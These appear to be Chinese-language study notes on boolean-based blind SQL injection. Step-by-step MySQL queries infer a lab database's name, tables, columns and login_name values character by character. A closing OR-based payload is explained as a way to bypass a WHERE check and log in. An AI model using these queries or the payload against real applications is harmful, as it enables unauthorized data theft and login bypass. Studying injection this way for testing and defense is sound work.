```sql
#获取database的name的长度
select * from aj_report.lesson_user where id = 1 and length(database()) = 9;

#获取database的name的第1个字符
select * from aj_report.lesson_user where id = 1 and substring(database(),1,1) = 'a';

#获取database的name的第2个字符
select * from aj_report.lesson_user where id = 1 and substring(database(),1,2) = 'aj';
select * from aj_report.lesson_user where id = 1 and substring(database(),2,1) = 'j';
......
#获取database的name的第1个字符
select * from aj_report.lesson_user where id = 1 and left(database(),1) = 'a';

#获取database中的表的名字
select * from lesson_user where id=1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())=19;
#获取database中的表的名字的长度(先获取第一个表的名字)
select * from lesson_user where id=1 AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1))=16;
select * from lesson_user where id=1 AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1,1))=2;
......
#获取database中的表的名字的第1个字符
select * from lesson_user where id=1 AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1),1,1)='a';
select * from lesson_user where id=1 AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1),2,1)='u';

#获取lesson_user中字段的个数
select * from aj_report.lesson_user where id=1 AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='lesson_user')=5;

#获取lesson_user中第1个字段的名字的长度
select * from aj_report.lesson_user where id=1 AND LENGTH((SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='lesson_user' LIMIT 0,1))=3;

#获取lesson_user中第1个字段的名字的第1个字符
select * from aj_report.lesson_user where id=1 AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='lesson_user' LIMIT 0,1),1,1)='i';

#获取lesson_user中表的login_name字段中第一个记录的长度
select * from aj_report.lesson_user where id=1 AND LENGTH((SELECT login_name FROM lesson_user LIMIT 0,1))=2;

#获取lesson_user中表的login_name字段中第一个记录的第1个字符
select * from lesson_user where id=1 AND SUBSTRING((SELECT login_name FROM lesson_user LIMIT 0,1),1,1)='1';


```

```sql

#盲注脚本
or(ascii(mid(code from 1 for 1))=1)
```

| 组件                     | 含义                                                         |
| ------------------------ | ------------------------------------------------------------ |
| `mid(code from 1 for 1)` | 提取字段 `code` 的第1个字符                                  |
| `ascii(...)`             | 将该字符转为ASCII码                                          |
| `=1`                     | 判断是否等于1（即判断code字段的第一个字符的ASCII值是否为1）  |
| `or (...)`               | 如果条件为真，则整体 `WHERE` 条件为真，从而绕过验证，成功登录或获取数据 |